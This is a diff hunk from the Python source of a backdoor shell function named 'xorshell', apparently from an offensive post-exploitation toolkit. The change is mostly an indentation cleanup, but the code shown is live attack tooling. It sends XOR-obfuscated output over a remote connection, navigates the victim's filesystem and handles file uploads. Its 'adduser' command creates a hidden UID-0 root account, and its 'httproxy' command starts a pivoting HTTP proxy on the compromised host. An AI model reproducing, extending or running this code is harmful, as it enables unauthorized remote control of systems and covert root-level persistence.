@@ -35,26 +35,30 @@ def xorshell():
              stdin=PIPE,
              )
         stdout, stderr = proc.communicate()
+
         if cmd2.startswith('cd'):
-	    destination = cmd2[3:].replace('\n','')
+            destination = cmd2[3:].replace('\n','')
             if os.path.isdir(destination):
-	        os.chdir(destination)
-	        conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
+                os.chdir(destination)
+                conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
             elif os.path.isdir(os.getcwd()+destination):
                 os.chdir(os.getcwd()+destination)
                 conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
             else:
-	        conn.send(xor("[!] Directory does not exist", PKEY)) 
-	        conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
+                conn.send(xor("[!] Directory does not exist", PKEY)) 
+                conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
+
         elif cmd2.startswith('adduser'):
             strip = cmd.split(" ")
             acct = strip[1]
             os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
             conn.send(xor("[+] Root account " + acct + " has been created.\n", PKEY)) 
+
         elif cmd2 == ("httproxy"):
-	    httpd = SocketServer.ForkingTCPServer(('', PPORT), Proxy)
+            httpd = SocketServer.ForkingTCPServer(('', PPORT), Proxy)
             conn.send(xor("[+] Serving HTTP proxy on port "+ PPORT +"", PKEY))
-	    httpd.serve_forever()  
+            httpd.serve_forever()  
+
         elif cmd2.startswith('upload'):
             getname = cmd2.split(" ")
             rem_file = getname[1]
